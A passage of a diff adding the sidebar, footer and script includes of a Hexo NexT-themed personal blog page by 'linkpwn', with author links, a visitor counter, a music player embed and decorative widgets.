+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">43</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/linkpwn" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;linkpwn" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:dkj20060328@qq.com" title="E-Mail → mailto:dkj20060328@qq.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://weibo.com/linkpwn" title="Weibo → https:&#x2F;&#x2F;weibo.com&#x2F;linkpwn" rel="noopener" target="_blank"><i class="fa fa-fw fa-weibo"></i>Weibo</a>
+      </span>
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+          <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1827600686&auto=1&height=66"></iframe>
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">linkpwn</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
+
+<!--单击显示文字-->
+<script type="text/javascript" src="/js/clickshowtext.js"></script>
+
+<!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/clicklove.js"></script>
+
+<canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
+<script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
+<script type="text/javascript" src="/js/fireworks.js"></script>
